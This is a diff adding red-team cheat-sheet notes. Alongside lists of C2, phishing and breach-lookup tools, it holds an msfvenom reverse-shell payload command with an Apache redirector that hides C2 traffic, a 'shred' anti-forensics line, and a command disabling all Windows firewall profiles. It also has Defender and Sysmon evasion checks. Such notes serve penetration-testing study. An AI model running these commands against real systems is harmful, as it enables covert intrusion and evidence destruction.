@@ -1,0 +1,86 @@
+Threat intellegance platforms:
+MITRE ATT&CK
+TIBER-EU
+OST Map
+
+TTP mapping:
+Mandiant Advantage
+Ontic
+CrowdStrike Falcon
+
+Cyber Kill Chain | MITRE ATT&CK
+Recon	| Reconnaissance
+Weaponization |	Execution
+Delivery | Initial Access
+Exploitation | Initial Access
+Installation |	Persistence / Defense Evasion
+Command & Control |	Command and Control
+Actions on Objectives |	Exfiltration / Impact
+
+C2 framework:
+Cobalt Strike
+Havoc
+Sliver
+
+Anti-forensics:
+shred -f -n 3 * ~overwrite all files three times
+BleachBit for Windows or Linux
+
+Setting up redirector server:
+sudo a2enmod rewrite && a2enmod proxy && a2enmod proxy_http && a2enmod headers && systemctl start apache2 && systemctl status apache2
+changing useragent in msvenom payload:
+msfvenom -p windows/meterpreter/reverse_http LHOST=tun0 LPORT=80 HttpUserAgent=NotReal -f exe -o shell.exe
+edit /etc/apache2/sites-available/000-default.conf:
+RewriteEngine On
+RewriteCond %{HTTP_USER_AGENT} "^NotReal$"
+ProxyPass "/" "http://localhost:8080/"
+
+C2 matrix:
+https://docs.google.com/spreadsheets/d/1b4mUxa6cDQuTV2BPC6aA-GR4zGZi0ooPYtBe4IgPsSc/edit#gid=0
+
+Github for RedTeam toolkit:
+https://github.com/infosecn1nja/Red-Teaming-Toolkit#Payload%20Development
+
+Open-Source Phishing Framework:
+getgophish.com
+
+SET - Social Engineering Toolkit:
+trustedsec.com
+
+Breaches:
+haveibeenpwned
+dehashed
+
+Default passwords:
+https://default-password.info/
+https://cirt.net/passwords
+
+Crawl web apps to create a wordlist:
+cewl -w wordlist.txt -d (number of depth) -m (number of minimum characters) http://website.com
+
+Username generator:
+https://github.com/therodri2/username_generator.git
+
+Powershell:
+Get-Help Get-Command -Examples ~explains Get-Command with example
+Get-Command Verb-* or Get-Command *-Noun ~pattern matching
+check for tcp/udp ports: netstat -na
+view arp table: arp -a
+check if machine part of AD: systeminfo
+get all active direcroty user accounts under TEST ou: Get-ADUser  -Filter * -SearchBase "OU=TEST,DC=TESTING,DC=COM"
+check for firewall existing:
+Get-CimInstance -Namespace root/SecurityCenter2 -ClassName AntivirusProduct
+wmic /namespace:\\root\securitycenter2 path antivirusproduct
+check service status of windows defender: Get-Service WinDefend
+check firewall profile on host: Get-NetFirewallProfile | Format-Table Name, Enabled
+disabling firewall profiles: Set-NetFirewallProfile -Profile Domain, Public, Private -Enabled False
+tes for inbound ports allowed (port 21): Test-NetConnection -ComputerName 127.0.0.1 -Port 21
+get firewall rules (root): Get-NetFirewallRule | select DisplayName, Enabled, Description
+detected threats with windowns defender: Get-MpThreat
+list of available event logs: Get-EventLog -List
+check if sysmon is running:
+Get-Process | Where-Object { $_.ProcessName -eq "Sysmon" }
+Get-CimInstance win32_service -Filter "Description = 'System Monitor service'"
+Get-Service | where-object {$_.DisplayName -like "*sysm*"}
+look for hidden directories, backup files:
+Get-ChildItem -Hidden -Path C:\Users\User\Desktop\
